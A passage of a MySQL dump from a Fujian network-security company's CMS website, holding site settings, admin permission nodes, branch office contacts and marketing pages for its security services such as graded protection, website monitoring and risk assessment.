INSERT INTO `xyh_meta` VALUES ('8','1','HTML_CACHE_INDEX_TIME','1200');
INSERT INTO `xyh_meta` VALUES ('9','1','HTML_CACHE_LIST_ON','0');
INSERT INTO `xyh_meta` VALUES ('10','1','HTML_CACHE_LIST_TIME','0');
INSERT INTO `xyh_meta` VALUES ('11','1','HTML_CACHE_SHOW_ON','0');
INSERT INTO `xyh_meta` VALUES ('12','1','HTML_CACHE_SHOW_TIME','0');
INSERT INTO `xyh_meta` VALUES ('15','9','ONLINE_CFG_MODE','0');
INSERT INTO `xyh_meta` VALUES ('13','1','HTML_CACHE_SPECIAL_ON','0');
INSERT INTO `xyh_meta` VALUES ('14','1','HTML_CACHE_SPECIAL_TIME','0');
INSERT INTO `xyh_meta` VALUES ('16','9','ONLINE_CFG_STYLE','blue');
INSERT INTO `xyh_meta` VALUES ('17','9','ONLINE_CFG_H','0');
INSERT INTO `xyh_meta` VALUES ('18','9','ONLINE_CFG_H_MARGIN','0');
INSERT INTO `xyh_meta` VALUES ('19','9','ONLINE_CFG_V','2');
INSERT INTO `xyh_meta` VALUES ('20','9','ONLINE_CFG_V_MARGIN','0');
INSERT INTO `xyh_meta` VALUES ('21','9','ONLINE_CFG_QQ','4006353500$$$点击咨询\r\n');
INSERT INTO `xyh_meta` VALUES ('22','9','ONLINE_CFG_WANGWANG','');
INSERT INTO `xyh_meta` VALUES ('23','9','ONLINE_CFG_PHONE_ON','1');
INSERT INTO `xyh_meta` VALUES ('24','9','ONLINE_CFG_PHONE','0591-87303705');
INSERT INTO `xyh_meta` VALUES ('25','9','ONLINE_CFG_GUESTBOOK_ON','0');
INSERT INTO `xyh_meta` VALUES ('26','9','ONLINE_CFG_QQ_PARAM','<a target=\'_blank\' href=\"http://wpa.qq.com/msgrd?v=3&uin=[客服号]&site=qq&menu=yes\" ><img src=\"http://pub.idqqimg.com/qconn/wpa/button/button_111.gif\" /></a>');
INSERT INTO `xyh_meta` VALUES ('27','9','ONLINE_CFG_WANGWANG_PARAM','');


# 转存表中的数据：xyh_model 
INSERT INTO `xyh_model` VALUES ('1','文章模型','','article','1','','List_article.html','Show_article.html','1');
INSERT INTO `xyh_model` VALUES ('2','页面模型','','page','1','','List_page.html','Show_page.html','2');
INSERT INTO `xyh_model` VALUES ('3','产品模型','','product','1','','List_product.html','Show_product.html','3');
INSERT INTO `xyh_model` VALUES ('4','图片模型','','picture','1','','List_picture.html','Show_picture.html','4');
INSERT INTO `xyh_model` VALUES ('5','下载模型','','soft','1','','List_soft.html','Show_soft.html','5');
INSERT INTO `xyh_model` VALUES ('13','自定义页面模型','自定义单页模型','newtb','1','','List_new.html','Show_new.html','6');
INSERT INTO `xyh_model` VALUES ('27','大事记模板','','Event','1','','List_event.html','Show_article.html','9');
INSERT INTO `xyh_model` VALUES ('31','证书模型','','Honor','1','','List_honor.html','Show_article.html','10');
INSERT INTO `xyh_model` VALUES ('32','自定义详情页面','','Detail','1','','List_detail.html','Show_article.html','11');
INSERT INTO `xyh_model` VALUES ('33','联系我们模型','','Contact','1','','List_contact.html','Show_article.html','12');
INSERT INTO `xyh_model` VALUES ('34','企业文化模型','','Culture','1','','List_article.html','Show_article.html','13');
INSERT INTO `xyh_model` VALUES ('35','服务类模型','','Service','1','','List_service.html','Show_article.html','19');


# 转存表中的数据：xyh_newtb 


# 转存表中的数据：xyh_node 
INSERT INTO `xyh_node` VALUES ('1','Manage','后台应用','1','','1','0','1');
INSERT INTO `xyh_node` VALUES ('2','Rbac','用户权限管理','1','','1','1','2');
INSERT INTO `xyh_node` VALUES ('3','index','用户列表','1','','1','2','3');
INSERT INTO `xyh_node` VALUES ('4','addUser','添加用户','1','','2','2','3');
INSERT INTO `xyh_node` VALUES ('5','editUser','编辑用户','1','','3','2','3');
INSERT INTO `xyh_node` VALUES ('6','delUser','删除用户','1','','4','2','3');
INSERT INTO `xyh_node` VALUES ('7','Index','前台应用','1','','2','0','1');
INSERT INTO `xyh_node` VALUES ('8','role','用户组列表','1','','5','2','3');
INSERT INTO `xyh_node` VALUES ('9','addRole','添加用户组','1','','6','2','3');
INSERT INTO `xyh_node` VALUES ('10','editRole','编辑用户组','1','','7','2','3');
INSERT INTO `xyh_node` VALUES ('11','delRole','删除用户组','1','','8','2','3');
INSERT INTO `xyh_node` VALUES ('12','access','权限管理','1','','9','2','3');
INSERT INTO `xyh_node` VALUES ('13','node','节点列表','0','','10','2','3');
INSERT INTO `xyh_node` VALUES ('14','addNode','添加节点','0','','11','2','3');
INSERT INTO `xyh_node` VALUES ('15','editNode','编辑节点','0','','12','2','3');
INSERT INTO `xyh_node` VALUES ('16','delNode','删除节点','0','','13','2','3');
INSERT INTO `xyh_node` VALUES ('17','System','系统设置','1','','2','1','2');
INSERT INTO `xyh_node` VALUES ('18','site','网站设置','1','','1','17','3');
INSERT INTO `xyh_node` VALUES ('19','Model','模型管理','1','','3','1','2');
INSERT INTO `xyh_node` VALUES ('20','index','模型列表','1','','1','19','3');
INSERT INTO `xyh_node` VALUES ('21','add','添加模型','1','','2','19','3');
INSERT INTO `xyh_node` VALUES ('22','edit','模型修改','1','','3','19','3');
INSERT INTO `xyh_node` VALUES ('23','del','删除模型','1','','4','19','3');
INSERT INTO `xyh_node` VALUES ('24','sort','更新排序','1','','5','19','3');
INSERT INTO `xyh_node` VALUES ('25','Category','栏目管理','1','','4','1','2');
INSERT INTO `xyh_node` VALUES ('26','index','栏目列表','1','','1','25','3');
INSERT INTO `xyh_node` VALUES ('27','add','添加栏目','1','','2','25','3');
INSERT INTO `xyh_node` VALUES ('28','edit','修改栏目','1','','3','25','3');
INSERT INTO `xyh_node` VALUES ('29','del','删除栏目','1','','4','25','3');
INSERT INTO `xyh_node` VALUES ('30','sort','更新栏目排序','1','','5','25','3');
INSERT INTO `xyh_node` VALUES ('31','Member','会员管理','1','','5','1','2');
INSERT INTO `xyh_node` VALUES ('32','index','会员列表','1','','1','31','3');
INSERT INTO `xyh_node` VALUES ('33','add','添加会员','1','','2','31','3');
INSERT INTO `xyh_node` VALUES ('34','edit','编辑会员','1','','3','31','3');
INSERT INTO `xyh_node` VALUES ('35','del','删除会员','1','','4','31','3');
INSERT INTO `xyh_node` VALUES ('36','Membergroup','会员组管理','1','','6','1','2');
INSERT INTO `xyh_node` VALUES ('37','index','会员组列表','1','','1','36','3');
INSERT INTO `xyh_node` VALUES ('38','add','添加会员组','1','','2','36','3');
INSERT INTO `xyh_node` VALUES ('39','edit','编辑会员组','1','','3','36','3');
INSERT INTO `xyh_node` VALUES ('40','del','删除会员组','1','','4','36','3');
INSERT INTO `xyh_node` VALUES ('41','Announce','公告管理','1','','7','1','2');
INSERT INTO `xyh_node` VALUES ('42','index','公告列表','1','','1','41','3');
INSERT INTO `xyh_node` VALUES ('43','add','添加公告','1','','2','41','3');
INSERT INTO `xyh_node` VALUES ('44','edit','编辑公告','1','','3','41','3');
INSERT INTO `xyh_node` VALUES ('45','del','删除公告','1','','4','41','3');
INSERT INTO `xyh_node` VALUES ('46','Link','友情链接','1','','8','1','2');
INSERT INTO `xyh_node` VALUES ('47','index','友情列表','1','','1','46','3');
INSERT INTO `xyh_node` VALUES ('48','add','添加友情','1','','2','46','3');
INSERT INTO `xyh_node` VALUES ('49','edit','编辑友情','1','','3','46','3');
INSERT INTO `xyh_node` VALUES ('50','del','删除友情','1','','4','46','3');
INSERT INTO `xyh_node` VALUES ('51','Guestbook','留言本管理','1','','9','1','2');
INSERT INTO `xyh_node` VALUES ('52','index','留言本列表','1','','1','51','3');
INSERT INTO `xyh_node` VALUES ('53','reply','回复留言','1','','2','51','3');
INSERT INTO `xyh_node` VALUES ('54','del','删除留言','1','','3','51','3');
INSERT INTO `xyh_node` VALUES ('55','clearCache','清除缓存','1','','2','17','3');
INSERT INTO `xyh_node` VALUES ('56','Personal','我的账户','1','','10','1','2');
INSERT INTO `xyh_node` VALUES ('57','index','修改资料','1','','1','56','3');
INSERT INTO `xyh_node` VALUES ('58','pwd','修改密码','1','','2','56','3');
INSERT INTO `xyh_node` VALUES ('59','Comment','评论管理','1','','10','1','2');
INSERT INTO `xyh_node` VALUES ('60','index','评论列表','1','','1','59','3');
INSERT INTO `xyh_node` VALUES ('61','edit','编辑评论','1','','2','59','3');
INSERT INTO `xyh_node` VALUES ('62','del','删除评论','1','','3','59','3');
INSERT INTO `xyh_node` VALUES ('63','Area','区域管理','1','','12','1','2');
INSERT INTO `xyh_node` VALUES ('64','index','区域列表','1','','1','63','3');
INSERT INTO `xyh_node` VALUES ('65','add','添加区域','1','','2','63','3');
INSERT INTO `xyh_node` VALUES ('66','edit','编辑区域','1','','3','63','3');
INSERT INTO `xyh_node` VALUES ('67','del','删除区域','1','','4','63','3');
INSERT INTO `xyh_node` VALUES ('68','Itemgroup','联动组管理','1','','13','1','2');
INSERT INTO `xyh_node` VALUES ('69','index','联动组列表','1','','1','68','3');
INSERT INTO `xyh_node` VALUES ('70','add','添加联动组','1','','2','68','3');
INSERT INTO `xyh_node` VALUES ('71','edit','编辑联动组','1','','3','68','3');
INSERT INTO `xyh_node` VALUES ('72','del','删除联动组','1','','4','68','3');
INSERT INTO `xyh_node` VALUES ('73','Iteminfo','联动管理','1','','14','1','2');
INSERT INTO `xyh_node` VALUES ('74','index','联动列表','1','','1','73','3');
INSERT INTO `xyh_node` VALUES ('75','add','添加联动','1','','2','73','3');
INSERT INTO `xyh_node` VALUES ('76','edit','编辑联动','1','','3','73','3');
INSERT INTO `xyh_node` VALUES ('77','del','删除联动','1','','4','73','3');
INSERT INTO `xyh_node` VALUES ('78','sort','更新排序','1','','5','73','3');
INSERT INTO `xyh_node` VALUES ('79','Special','专题管理','1','','15','1','2');
INSERT INTO `xyh_node` VALUES ('80','index','专题列表','1','','1','79','3');
INSERT INTO `xyh_node` VALUES ('81','add','添加专题','1','','2','79','3');
INSERT INTO `xyh_node` VALUES ('82','edit','编辑专题','1','','3','79','3');
INSERT INTO `xyh_node` VALUES ('83','del','删除专题','1','','4','79','3');
INSERT INTO `xyh_node` VALUES ('84','trach','回收站','1','','5','79','3');
INSERT INTO `xyh_node` VALUES ('85','restore','还原专题','1','','6','79','3');
INSERT INTO `xyh_node` VALUES ('86','clear','彻底删除','1','','7','79','3');
INSERT INTO `xyh_node` VALUES ('87','Block','自由块管理','1','','16','1','2');
INSERT INTO `xyh_node` VALUES ('88','index','自由块列表','1','','1','87','3');
INSERT INTO `xyh_node` VALUES ('89','add','添加自由块','1','','2','87','3');
INSERT INTO `xyh_node` VALUES ('90','edit','编辑自由块','1','','3','87','3');
INSERT INTO `xyh_node` VALUES ('91','del','删除自由块','1','','4','87','3');
INSERT INTO `xyh_node` VALUES ('92','Database','数据库管理','1','','17','1','2');
INSERT INTO `xyh_node` VALUES ('93','index','数据表列表','1','','1','92','3');
INSERT INTO `xyh_node` VALUES ('94','backup','数据库备份','1','','2','92','3');
INSERT INTO `xyh_node` VALUES ('95','optimize','数据表优化','1','','3','92','3');
INSERT INTO `xyh_node` VALUES ('96','repair','数据表修复','1','','4','92','3');
INSERT INTO `xyh_node` VALUES ('97','restore','还原管理','1','','5','92','3');
INSERT INTO `xyh_node` VALUES ('98','restoreData','数据恢复','1','','6','92','3');
INSERT INTO `xyh_node` VALUES ('99','delSqlFiles','删除文件','1','','7','92','3');
INSERT INTO `xyh_node` VALUES ('100','url','伪静态缓存设置','1','','3','17','3');
INSERT INTO `xyh_node` VALUES ('101','ClearHtml','静态缓存管理','1','','18','1','2');
INSERT INTO `xyh_node` VALUES ('102','all','一键更新全站','1','','1','101','3');
INSERT INTO `xyh_node` VALUES ('103','home','更新首页','1','','2','101','3');
INSERT INTO `xyh_node` VALUES ('104','lists','更新栏目','1','','3','101','3');
INSERT INTO `xyh_node` VALUES ('105','shows','更新文档','1','','4','101','3');
INSERT INTO `xyh_node` VALUES ('106','special','更新专题','1','','5','101','3');
INSERT INTO `xyh_node` VALUES ('107','Menu','菜单管理','1','','19','1','2');
INSERT INTO `xyh_node` VALUES ('108','index','菜单列表','1','','1','107','3');
INSERT INTO `xyh_node` VALUES ('109','add','添加菜单','1','','2','107','3');
INSERT INTO `xyh_node` VALUES ('110','edit','修改菜单','1','','3','107','3');
INSERT INTO `xyh_node` VALUES ('111','sort','排序更新','1','','4','107','3');
INSERT INTO `xyh_node` VALUES ('112','qk','快捷更新','1','','5','107','3');
INSERT INTO `xyh_node` VALUES ('113','del','删除菜单','1','','6','107','3');
INSERT INTO `xyh_node` VALUES ('114','Attachment','已上传文件管理','1','','20','1','2');
INSERT INTO `xyh_node` VALUES ('115','index','文件列表','1','','1','114','3');
INSERT INTO `xyh_node` VALUES ('116','del','删除文件','1','','4','114','3');
INSERT INTO `xyh_node` VALUES ('117','Abc','广告管理','1','','21','1','2');
INSERT INTO `xyh_node` VALUES ('118','index','广告位列表','1','','1','117','3');
INSERT INTO `xyh_node` VALUES ('119','add','添加广告位','1','','2','117','3');
INSERT INTO `xyh_node` VALUES ('120','edit','修改广告位','1','','3','117','3');
INSERT INTO `xyh_node` VALUES ('121','del','删除广告位','1','','4','117','3');
INSERT INTO `xyh_node` VALUES ('122','detail','广告列表','1','','5','117','3');
INSERT INTO `xyh_node` VALUES ('123','addDetail','添加广告','1','','6','117','3');
INSERT INTO `xyh_node` VALUES ('124','editDetail','修改广告','1','','7','117','3');
INSERT INTO `xyh_node` VALUES ('125','sort','更新广告排序','1','','7','117','3');
INSERT INTO `xyh_node` VALUES ('126','getcode','获取广告代码','1','','8','117','3');
INSERT INTO `xyh_node` VALUES ('127','delDetail','删除广告','1','','9','117','3');
INSERT INTO `xyh_node` VALUES ('128','Templets','模板管理','1','','22','1','2');
INSERT INTO `xyh_node` VALUES ('129','index','模板列表','1','','1','128','3');
INSERT INTO `xyh_node` VALUES ('130','add','添加模板','1','','2','128','3');
INSERT INTO `xyh_node` VALUES ('131','edit','修改模板','1','','3','128','3');
INSERT INTO `xyh_node` VALUES ('132','del','删除模板','1','','4','128','3');
INSERT INTO `xyh_node` VALUES ('133','Article','文章管理','1','','20','1','2');
INSERT INTO `xyh_node` VALUES ('134','loadNews','采集文章','1','','1','133','3');


# 转存表中的数据：xyh_office 
INSERT INTO `xyh_office` VALUES ('1','福建海峡信息技术有限公司','福建省福州市北环中路61号海峡大楼','400-6356-500$$$ 0591-87303705//06/07 $$$ 0591-87303710//02/03','0591-87303709','','350003');
INSERT INTO `xyh_office` VALUES ('2','厦门办事处','厦门市思明区洪莲西里160号1401室','0592-5122819','0592-5122819','范砚池','');
INSERT INTO `xyh_office` VALUES ('3','泉州办事处','泉州市宝洲路南丰新城玉兰苑2栋7C','0595-22576310、22577310','0595-22577310','赖孝友','');
INSERT INTO `xyh_office` VALUES ('4','三明办事处','三明市梅列区丁香新村52栋504','(0598)8226785 18960568176','(0598)8226785 ','张戟','');
INSERT INTO `xyh_office` VALUES ('5','龙岩办事处','龙岩市西陂路286号西山小区A2栋406','0597-2586623','0597-2586623','游娇丽','');
INSERT INTO `xyh_office` VALUES ('6','漳州办事处','漳州龙文区迎宾大道10号锦绣一方蔷薇里4幢3B','0596-2968273','0596-2968273','陈少勇','');
INSERT INTO `xyh_office` VALUES ('7','湖北办事处','武汉市洪山区珞狮南路南国雄楚广场A3栋822室','027-87860065、18986037296','027-87654053','韩苏','');
INSERT INTO `xyh_office` VALUES ('8','四川办事处','成都市锦江区佳宏北路36号6栋25楼05室','18602887474','028-65194705','郑刚','');
INSERT INTO `xyh_office` VALUES ('9','新疆办事处','乌鲁木齐市新市区河南西路23街13楼20号','15699126518、0991-2815591','0991-2815591','肖大力','');
INSERT INTO `xyh_office` VALUES ('10','江西办事处','南昌市抚河中路华财大厦A156室','13576139449、0791-6693397','0791- 6695770','胡争明','');


# 转存表中的数据：xyh_orderaction 


# 转存表中的数据：xyh_orderdetail 


# 转存表中的数据：xyh_orderinfo 


# 转存表中的数据：xyh_page_detail 
INSERT INTO `xyh_page_detail` VALUES ('3','44','医疗卫生系统安全等级保护建设解决方案','','医院等级保护建设过程$$$方案设计框架$$$ 方案建设内容$$$ 客户价值','“适度安全、分级保护”是等级保护安全建设的基本方法，等级保护可以把业务系统、信息资产、安全边界等进行“等级化”，分而治之，从而实现信息安全等级保护的“适度安全、分级保护”思想。海峡信息以国家相关法规标淮为依据，以海峡信息等级保护知识库和支撑平台为基础，形成合理的安全评估、规划设计、解决方案和系列安全服务，构成等级保护安全建设体系。$$$医院信息系统安全等级保护体系框架在国家政策、法律法规指引的前提下，以安全基础设施为依托，与信息系统的业务流程、应用架构和数据资源紧密结合，从安全技术、安全管理为要素进行框架设计。根据等保安全要求，海峡信息提出如下的安全整改建议，以下是信息安全保障总体框架模型。$$$海峡信息参照公安部等级保护基本要求进行等级保护安全体系设计，用于指导和促进医院信息系统的等级保护建设工作。安全技术体系设计将从网络安全、主机安全、应用安全等方面进行，以下图医院信息系统拓扑为例，依据福建省卫生厅及福建省公安厅发布的相关文件$$$海峡信息医院信息系统等级保护三级整改方案参照等级保护基本要求等标淮，同时进行总体的安全技术设计，将不同区域、不同层面的安全保护措施形成有机的安全保护体系，采用成熟可靠的安全产品，对网络安全、主机安全、应用安全等方面进行改造建设，最大程度发挥安全措施的保护能力，帮助客户信息系统在安全性上达到对应等级保护要求的强度和标淮。该方案从整体上进行\r\n规划设计，能够避免重复建设，充分保炉好用户的投资。','/uploads/img1/20170702/595890fb55a13.jpg|||/uploads/img1/20170702/5958915060d3b.jpg|||/uploads/img1/20170702/595891956b8e8.jpg','');
INSERT INTO `xyh_page_detail` VALUES ('4','13','福建省海峡信息技术有限公司','福建省海峡信息技术有限公司成立于1999年，是福建省科技信息研究所控股的高新技术企业，专业在网络安全技术领域从事技术研究、产品销售、信息安全服务等业务，现有员工150余人。公司是福建省软件行业协会、福建省卫生信息协会、福建省商用密码行业协会的理事单位，荣获国家密码管理局颁发的“商用密码产品生产定点单位”（国密局产字SSC1068号）、“商用密码产品销售许可证” （国密局销字SXS1390号）证书，入选“福建省信息网络安全事件应急处置安全服务试点单位”、“福建省软件技术研发中心”、“福建省创新型企业”和“福建省信息网络安全企业工程技术研究中心”，并被福建省网安办聘为“福建省网络与信息安全应急技术支持单位”，公司注册的“黑盾”商标荣获“福建省著名商标”称号。\r\n',' $$$ $$$ $$$ ','通过十多年的产品研发和发展，海峡信息公司拥有全面的信息网络安全产品研发管理及技术创新能力，自主研发的黑盾系列网络安全产品（黑盾防火墙、黑盾网络入侵检测系统、黑盾入侵防御系统、黑盾堡垒机、黑盾虚拟专用网关、黑盾安全审计系统、黑盾抗攻击网关系统、黑盾终端管理系统、黑盾文档安全管理系统）均已获得国家公安部、国家保密局、国家信息安全产品认证中心及中国人民解放军信息安全测评认证中心的认证，其中“IPSec VPN安全网关”，于2014年获得国家密码管理局颁发的商用密码产品型号证书（批准型号：SJJ1106），黑盾数据库安全监管综合平台”项目荣获“2015年度福建省科学技术进步奖三等奖”。目前，黑盾系列网络安全产品已广泛应用于政府、卫生、教育、银行、电信、公安、证券、电力等行业，黑盾系列网络安全产品作为“数字福建”项目中的重点推荐品牌，已成功参与福建省政务信息网的网络安全建设。$$$随着社会信息化程度的不断提高，“信息就是财富，安全才有价值”的经营理念已成为社会各界共识，安全需求也从最初的信息保密性需求，发展到目前的信息保障需求。信息安全服务是海峡公司近年来为客户提供重要信息系统安全保障的核心业务之一，海峡信息安全服务体系以保障用户的业务安全为指导方针，建立了以应用安全为主体、网络安全为基础的服务保障体系，为客户提供多个层次的风险评估与测试、安全加固与整改、安全监控与响应、安全策略与等保咨询等服务，全面帮助客户识别业务系统的安全问题，并提供针对性和可实际操作的信息安全解决方案，大力提高客户控制、转移、降低甚至消除安全风险的能力，保障业务的效率和效益，促进信息化的可持续健康发展。海峡信息2005年就获得了中国信息安全测评中心颁发的“信息安全服务资质证书（安全工程类一级）”，2015年获得了国内安全服务最高级别认证“信息安全服务资质证书（安全工程类二级）”（目前为止福建省内唯一一家通过该认证），2016年10月公司获得公安部等保建设服务机构能力评估合格证书，2016年11月公司建设运营的“福建省海峡软件应用安全公共服务平台”成功入选2016年福建省互联网经济重点公共服务平台，成为省财政扶持建设项目中信息网络空间安全方向的唯一重点资质对象，海峡信息成为福建本土信息安全服务的领军企业。$$$另外，海峡信息是福建省唯一专业从事信息网络技术研究的省级重点实验室(福建省信息网络重点实验室)的承建者和运营者，建设有“大规模网站安全监控平台”、“大规模在线漏洞评估平台”、”日志分析平台”等专业安全服务平台，拥有Smartbits、安捷伦、TheatEX等安全专业测试仪器。公司培养了一批安全攻防和安全研究队伍，拥有多名国家注册安全专业人员（CISP）以及Web安全、网络安全、系统安全等各方面的专业人才队伍。公司从2002年开始便被福建省公安厅入选为“信息网络安全服务应急处置单位”，在网络安全应急处置方面积累了丰富的经验，为公安部门提供漏洞检测、安全通告、应急处置等安全技术支撑工作，在历年的“奥运安保”、“世博安保”、“70周年阅兵保障”到“G20杭州会议安保”活动中均表现突出。\r\n$$$海峡信息公司已成为众多企事业单位值得信赖的网络安全整体解决方案提供商，展望未来，海峡信息公司以“黑盾，安全缔造信息未来”作为经营理念，以人为本，共同携手客户和合作伙伴，创建一个安全的网络世界。\r\n','','');
INSERT INTO `xyh_page_detail` VALUES ('5','84','网站安全服务','网站出现木马、用户名密码被窃取、访问网页速度慢等问题极大地困扰着网站提供者，它给企业形象、<br/>信息网络甚至核心业务造成严重的破坏。虽然可以通过部署入侵保护系统、网站防火墙等相关防御类产品来起到一定的防御效果，但是显然这不是万全之策，用户难以更早的发现风险隐患，预防这些安全事件。另外安全管理员需要维护大量的安全设备，分析众多日志信息，带来额外的工作量。 \r\n若能够主动的发现网站的风险隐患，并及时采取修补措施，则可以降低风险、减少损失，海峡信息针对该需求，结合软件即服务（SaaS）的服务模式，推出网站安全漏洞检测，网站源代码加固，网站安全监测，网站网页防篡改一体化服务解决方案。通过全面深入的漏洞识别、7×24小时不间断的远程专家值守，为客户互联网网站提供远程安全监测、安全检查、实时响应和人工分析服务，是构建完善的网站安全体系的最好补充。','客户需求：$$$服务介绍：$$$一.网站漏洞检测$$$二.网站安全加固$$$三.网站安全监控$$$四.网站定期巡检$$$五.定期汇总报告$$$客户价值：','门户网站是我们公司的门面，但总是有些不法之徒来破坏。\r\n和平时相比，节假日的情况更严峻，网站无人看守，我们又不能把服务停了。\r\n我们不是专业的安全人员，无法看到网站的潜在威胁，但总是能听说这方面的报道，让我们胆战心惊。$$$海峡信息网站安全一体化服务，是一项托管式服务，客户无需安装任何硬件或软件，无需改变目前的网络部署状况，无需专门的人员进行安全设备维护及分析日志。只需要将监测的网站域名告知海峡信息安全团队，许可后即可获得7×24小时的网站安全监测服务，一旦客户的网站遇到风险状况后，海峡信息安全团队会在第一时间与客户确认，并提供专业的解决方案建议。同时，海峡信息安全专家会根据监控情况定期出具周期性的监测报告，让客户整体掌握网站的风险状况及安全趋势。除此之外，海峡信息安全团队将周期性对客户的网站进行现场评估，识别客户网站、应用系统、服务器等当前的安全漏洞和已知的安全弱点，并提供专业的安全加固措施。包括以下几点$$$海峡信息网站安全以在线检测为主，人工渗透测试为辅的服务方式，基于互联网远程检测，测试和识别客户网站当前的安全漏洞和存在的安全弱点，并对WEB应用系统进行全面、深入和扩大化的安全漏洞识别、挖掘和利用。$$$  针对网站漏洞深度检测的结果，海峡信息安全服务团队从web服务器安全、web源代码安全、web应用系统安全，这三个方面出发，为客户提供专业的安全加固措施及有效的安全加固办法，从实质上提高WEB安全。$$$海峡信息安全服务团队为客户提供多种监控服务，满足客户多种需求，包括但不限于：一次性复查服务、重大节日检测服务、7×24h安全监控服务、5×8h安全监控服务等。为客户网站提供网站的可用性监控、网站的页面篡改监控、网站挂马监控等并同时提供网站应急响应服务。这些信息将通过邮件、短信等方式直接提醒安全服务部的工程师，确保网站的可用性、安全性实时掌控。$$$ 对客户门户网站进行安全巡检，及时修补网站中被发现的安全 漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当网站本身或网站服务器出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内 处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。$$$ 海峡网站安全服务将定期为用户汇总监测数据，统计并分析出近期网站存在的漏洞处理情况、网页木马及篡改发生的频率及处理情况、网站可用性以及可用性情况供用户 参考。通过汇总报告可以更为全面的了解网站的服务质量、安全防护水平。周期性全自动化监测，可负责对网站的内容安全（如ICP备案情况、敏感关键字、挂马）和脆弱性（如SQL注入、跨站脚本、WEB后门）问题进行监测，并提供详细的监测报告展示，让您对所监测网站的安全状况一目了然。$$$7×24小时在线监控，不遗漏一个风险、\r\n专家人工验证，不再为误报心惊肉跳、\r\n第一时间掌握网站安全状况和潜在风险、\r\n实时告警、定期报告，让您安枕无忧、\r\n托管式安全服务，节约您的投资和管理成本。 ','/uploads/img1/20170616/594399ed407b9.png',' 福州市奥运安保信息网络安全大检查的280家企事业单位、福州市重点信息网络监管单位重要会议中的120家企事业单位、福州市公安局、兴业证券股份有限公司 、  福建省侨办 、  福建省自考办、 福建省人事厅、   福建省师大人武学院、   湖南省商务厅 、  中国上海兴业期货网站等');
INSERT INTO `xyh_page_detail` VALUES ('6','85','应用软件安全测试','多年以来，有两点我可以确定：一是对于高保障性（high assurance）软件的社会需求呈不断增长的态势；二是市场从来就不会提供这样的软件。——Earl Boebert','前言$$$服务介绍$$$特点','在以前的单机时代，安全问题主要是操作系统容易感染病毒，单机应用程序软件安全问题并不突出。但是自从互联网普及后，软件安全问题愈加显加突显，使得软件安全性测试的重要性上升到一个前所未有的高度。 软件安全性是一个广泛而复杂的主题，每一个新的软件总可能有不符合所有已知模式的新型安全性缺陷出现。近年来， 类似于CSDN、天涯网大规模用户信息泄露的安全事件时有发生，这些安全事件的根本原因是应用软件自身存在软件安全漏洞。如果应用系统能够在上线之初就能够执行专业的Web应用上线测试服务，很多安全问题就能够消灭在萌芽中。$$$ 海峡信息建立起应用安全研究团队，专注于应用软件安全方面的漏洞研究、攻防研究和代码加固研究，并通过深入研究来自于微软的“软件安全开发生命周期”流程，提出了海峡信息应用软件安全开发生命周期解决方案，$$$ 海峡信息“应用上线测试”服务采用了黑盒与白盒测试技术相结合服务模式，旨在针对“电子政务、电子商务”重要应用应用系统的应用安全展开全面的安全测试，该测试参照国际开放Web应用安全组织（OWASP）相关规范并结合海峡信息多年的最佳实践经验，可以在应用系统上线前或运行中展开安全测试。','/uploads/img1/20170616/59439b74ba6a3.png','');
INSERT INTO `xyh_page_detail` VALUES ('7','86','安全运维外包',' 近年来，新技术浪潮接踵而至，黑客攻击手法也与时俱进。0day攻击、APT攻击让传统的安全设备防护模式捉襟见肘。海峡信息认为在新形势下的安全对抗，不能让缺乏智慧的安全设备与拥有智慧的“骇客”单独对抗，而应该在安全专业团队的参与下来打赢这场信息安全保卫战。\r\n','客户需求$$$服务介绍$$$运维流程$$$客户价值','我们单位的网络安全的短板在哪儿？\r\n我们单位买了很多安全产品，现在要怎么用比较合理？\r\n我们单位买了一堆安全产品，可是还是出了安全问题，有点没招了！\r\n数据中心安全运维怎么形成安全运维体系化、专业化以保障整体安全？$$$ 海峡信息构建了专业的信息安全运营服务团队，凭借丰富的攻防经验和规范化的服务水平，依托强大的安全服务支撑平台，为客户提供“安全运维服务”（Managed Security Services Provider，SI-MSS）。海峡信息“安全运维服务（SI-MSS）”，以现场为主，远程为辅，采用主动预防的方式，面向各级政府数据中心、云计算数据中心、政府网站群、企业数据中心等提供安全运维服务。为用户提供专业安全保障，降低信息安全投入成本，使用户专注于自己的核心业务，提高本单位的综合竞争力，提升客户在安全方面的投入产出比。$$$海峡信息SI-MSS安全运维提供定期对网络设备、安全设备、主机系统进行安全巡检，及时修补信息系统中被发现的安全漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当设备出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。$$$ 为企业面向互联网的信息网络提供安全保障业务，降低企业信息安全投入成本，使企业专注于自己的核心业务，提高企业的综合竞争力，提升客户在安全方面的投入产出比。','/uploads/img1/20170616/59439bdf5a532.png|||/uploads/img1/20170616/59439bf798abc.PNG','');
INSERT INTO `xyh_page_detail` VALUES ('8','87','风险评估与规划','信息系统存在的脆弱性是不可避免的，经过几十年的研究，大家发现这是由于人为的错误所造成的，对于现在我们所使用的一个庞大的、复杂的技术系统来说，恐怕在长时间内是不可避免的。因此，在现实环境中，人们总是要面临着各种各样的威胁，或者是信息安全风险是必然的。在这种情况下，通过适当的、足够的，有时候是综合的安全措施来控制风险，最终目的是使残余下来的风险可以降低到最低程度。任何信息系统都会有安全风险，所以，人们追求的所谓安全的信息系统，实际是指信息系统在实施了风险评估并做出风险控制后，仍然存在的残余风险可被接受的信息系统。','服务介绍$$$客户价值','信息安全风险评估是一个识别、控制、降低或消除可能影响信息系统的安全风险的过程。海峡信息遵照国家《信息安全风险评估规范》（GB/T 